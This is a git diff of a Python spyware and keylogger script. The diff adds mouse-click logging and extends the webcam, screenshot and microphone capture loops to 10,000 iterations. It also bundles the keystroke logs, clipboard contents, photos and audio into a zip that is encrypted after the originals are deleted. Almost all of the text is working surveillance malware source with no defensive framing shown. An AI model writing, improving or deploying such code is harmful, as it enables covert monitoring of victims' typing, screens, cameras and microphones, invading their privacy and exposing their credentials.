@@ -1,3 +1,5 @@
+######################################## IMPORT STATEMENTS ########################################
+
 import logging
 import requests
 import pyaudio
@@ -14,14 +16,19 @@ import pathlib
 import sounddevice
 import wavio
 import zipfile
-from pynput import keyboard
+import shutil
+import sys
+
+from pynput import keyboard, mouse
 from pynput.keyboard import Key
 from pynput.keyboard import Listener
 from cryptography.fernet import Fernet
 from PIL import ImageGrab
 from multiprocessing import Process
 
-# Constants
+
+######################################## CONSTANTS ########################################
+
 SCREEN = 'Screenshots'
 WEBCAM = 'WebcamPics'
 LOG_FILE = "keylogfile.txt"
@@ -36,9 +43,8 @@ RATE = 48000
 # Initialize PyAudio
 audio = pyaudio.PyAudio()
 
-# Setup logs files
-def setup_logging():
-    logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format="%(asctime)s - %(message)s", datefmt="%Y-%m-%d %H:%M:%S", filemode='a')
+
+######################################## LOGS ########################################
 
 # Get system information
 def get_system_info():
@@ -59,28 +65,39 @@ def get_system_info():
 
     return info
 
+# Mouse click
+def on_mouse_click(pressed, button, x,y):
+    if pressed:
+        logging.info(f"Mouse clicked at ({x}, {y}) with {button} button")
+
+
 # Log system information
 def log_system_info():
+    logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format="%(asctime)s - %(message)s", datefmt="%Y-%m-%d %H:%M:%S", filemode='a')
     info = get_system_info()
-    for key, value in info.items():
-        logging.info(f"{key}: {value}")
+
+    for i, value in info.items():
+        logging.info(f"{i}: {value}")
     logging.info("LOGS : \n[Date Hour - 'Key' or 'Mouse Action']:")
 
-# Handler for key press event
-def on_press(key):
-    logging.info(f"[Key Pressed] - {key}")
+    on_press = lambda key : logging.info(f"[Key Pressed] - {key}")
+    with Listener(on_press=on_press) as listener, mouse.Listener(on_press=on_mouse_click) as mouseclick:
+        listener.join()
+        mouseclick.join()
+
 
 # Audio Recording
 def Audio():
     pathlib.Path(WAVE_OUTPUT_FILENAME).mkdir(parents=True, exist_ok=True)
     fs = 44100
-    seconds = 20
+    seconds = 30
 
-    for x in range(20):
+    for x in range(10000):
         recording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
         sounddevice.wait()
         output_filename = f'{WAVE_OUTPUT_FILENAME}/mic_recording_{x}.wav'
         wavio.write(output_filename, recording, fs, sampwidth=3)
+
 
 # Capture images from webcam
 def webcam():
@@ -88,16 +105,17 @@ def webcam():
         pathlib.Path(WEBCAM).mkdir(parents=True, exist_ok=True)
         cam_path = 'WebcamPics/'
         cam = cv2.VideoCapture(0)
-        for x in range(20):
+        for x in range(10000):
             ret, img = cam.read()
             file = (cam_path + f'{x}.jpg')
             cv2.imwrite(file, img)
-            time.sleep(10)
+            time.sleep(5)
 
         cam.release()
         cv2.destroyAllWindows()
     except Exception as e:
         print("WebcamPics could not be saved: " + str(e))
+
 
 # Monitor clipboard
 def clipboard():
@@ -119,51 +137,71 @@ def clipboard():
         with open(CLIPBOARD, "a") as file:
             file.write("\n Clipboard could not be copied: " + str(e) + "\n")
 
+
 # Screenshot
 def screenshot():
     try:
         pathlib.Path(SCREEN).mkdir(parents=True, exist_ok=True)
         screen_path = 'Screenshots/'
 
-        for x in range(0, 10):
+        for x in range(0, 10000):
             pic = ImageGrab.grab()
             pic.save(screen_path + f'screenshot{x}.png')
             time.sleep(5)
     except Exception as e:
         print("Screenshots could not be saved: " + str(e))
 
+
 # Function to create a ZIP file with specified files and folders
-def create_zip(files_and_folders, output_zip_file):
-    with zipfile.ZipFile(output_zip_file, 'w', zipfile.ZIP_DEFLATED) as zipf:
+def zip_folders(files_and_folders, zip_path):
+    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
         for item in files_and_folders:
             if os.path.isdir(item):
-                for root, dirs, files in os.walk(item):
+                for root, _, files in os.walk(item):
                     for file in files:
                         file_path = os.path.join(root, file)
-                        zipf.write(file_path, os.path.relpath(file_path, item))
-            if os.path.isfile(item):
-                zipf.write(item, os.path.basename(item))
+                        arcname = os.path.relpath(file_path, item)
+                        zipf.write(file_path, os.path.join(os.path.relpath(root, item), arcname))
+            else:
+                arcname = os.path.basename(item)
+                zipf.write(item, arcname)
+
+
 
 # Function to encrypt the created ZIP file
 def encrypt_zip(zip_file_path):
     with open('keyfile.key', 'rb') as keyfile:
         key = keyfile.read()
+
     fernet = Fernet(key)
+
     with open(zip_file_path, 'rb') as unencrypted_zip:
         zip_data = unencrypted_zip.read()
+
     encrypted_zip_data = fernet.encrypt(zip_data)
+    
     with open(zip_file_path, 'wb') as encrypted_zip:
         encrypted_zip.write(encrypted_zip_data)
 
 
 
+# Delete the files and folders
+def delete(files_and_folders):
+    for item in files_and_folders:
+            try:
+                if os.path.isdir(item):
+                    shutil.rmtree(item)
+                else:
+                    os.remove(item)
+            except Exception as e:
+                print(f"Failed to delete {item}: {e}")
+
+
 def main():
     try:
-        setup_logging()
-        log_system_info()
-        
         # Create a list of processes for each task
         processes = []
+        processes.append(Process(target=log_system_info))
         processes.append(Process(target=clipboard))
         processes.append(Process(target=webcam))
         processes.append(Process(target=Audio))
@@ -173,10 +211,8 @@ def main():
         for process in processes:
             process.start()
 
-        # Start listening to key presses
-        with Listener(on_press=on_press) as key_listener:
-            # Wait for 20 seconds
-            time.sleep(20)
+        # Wait for 20 seconds
+        time.sleep(20)
         
         # Terminate the processes
         for process in processes:
@@ -187,10 +223,12 @@ def main():
             process.join()
         
         # Specify files and folders to include in the ZIP
-        files_and_folders = [LOG_FILE, CLIPBOARD, SCREEN, WEBCAM]
+        files_and_folders = [LOG_FILE, CLIPBOARD, SCREEN, WEBCAM, WAVE_OUTPUT_FILENAME]
         
         # Create a ZIP file with the specified files and folders
-        create_zip(files_and_folders, ZIP)
+        zip_folders(files_and_folders, ZIP)
+
+        delete(files_and_folders)
         
         # Encrypt the created ZIP file
         encrypt_zip(ZIP)
@@ -204,10 +242,9 @@ if __name__ == '__main__':
         if os.path.exists("keyfile.key"):
             main()
         else:
-            print("Vous avez oublié de générer la clé.")
+            print("I think you forgot to generate the key.")
 
-    except KeyboardInterrupt:
-        print("La commande Control-C a été entrée... Le programme se termine.")
-    
-    except Exception as e:
-        logging.exception(f"Une erreur s'est produite : {str(e)}")
+    except Exception as ex:
+        logging.basicConfig(level=logging.DEBUG, filename='error_log.txt')
+        logging.exception('* Error Ocurred: {} *'.format(ex))
+        pass
